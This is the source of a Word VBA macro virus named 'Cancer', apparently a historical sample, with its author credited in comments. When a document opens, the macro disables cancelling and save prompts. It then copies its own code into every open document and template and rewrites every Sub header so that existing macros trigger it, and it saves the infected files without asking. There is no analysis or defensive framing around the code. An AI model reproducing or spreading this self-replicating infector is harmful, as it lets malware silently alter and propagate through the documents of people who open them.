   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True
   Private Function Cancer()
   Application.EnableCancelKey = wdCancelDisabled
   Options.SaveNormalPrompt = False
   Options.ConfirmConversions = False
   Set TD = ThisDocument.VBProject.VBComponents
   For FindCode = 1 To TD.Count
   If TD.Item(FindCode).CodeModule.CountOfLines > 0 Then
   For CodeLines = 1 To TD.Item(FindCode).CodeModule.CountOfLines
   If TD.Item(FindCode).CodeModule.Lines(CodeLines, 1) = "Private Function Cancer()" Then
   MyCode = TD.Item(FindCode).CodeModule.Lines(CodeLines, 40)
   End If
   Next
   End If
   Next
   For MainLoop = 1 To 2
   If MainLoop = 1 Then Set Target = Documents Else Set Target = Templates
   For TargetCount = 1 To Target.Count
   Set TargetComponents = Target(TargetCount).VBProject.VBComponents
   For ModuleCount = 1 To TargetComponents.Count
   Function_Exist = False
   TargetCodeChanged = False
   For TargetLines = 1 To TargetComponents(ModuleCount).CodeModule.CountOfLines
   If TargetComponents(ModuleCount).CodeModule.Lines(TargetLines, 1) = "Private Function Cancer()" Then Function_Exist = True
   If Left(TargetComponents(ModuleCount).CodeModule.Lines(TargetLines, 1), 12) = "Private Sub " And Right(TargetComponents(ModuleCount).CodeModule.Lines(TargetLines, 1), 8) <> ": Cancer" Then
   TargetComponents(ModuleCount).CodeModule.ReplaceLine TargetLines, TargetComponents(ModuleCount).CodeModule.Lines(TargetLines, 1) & ": Cancer"
   TargetCodeChanged = True
   ElseIf Left(TargetComponents(ModuleCount).CodeModule.Lines(TargetLines, 1), 4) = "Sub " And Right(TargetComponents(ModuleCount).CodeModule.Lines(TargetLines, 1), 8) <> ": Cancer" Then
   TargetComponents(ModuleCount).CodeModule.ReplaceLine TargetLines, TargetComponents(ModuleCount).CodeModule.Lines(TargetLines, 1) & ": Cancer"
   TargetCodeChanged = True
   End If
   Next
   If Function_Exist = False Then TargetComponents(ModuleCount).CodeModule.AddFromString MyCode
   If Function_Exits = False Or TargetCodeChanged = True Then
   If MainLoop = 1 Then Documents(TargetCount).SaveAs FileName:=Documents(TargetCount).FullName
   If MainLoop = 2 Then Templates(TargetCount).Save
   End If
   Next
   Next
   Next
   End Function
   Private Sub Document_Open(): Cancer
   'My_Creator = Lys Kovick
   'My_Name = Cancer
   'My_Comments = Devil|liveD - God|doG
   End Sub
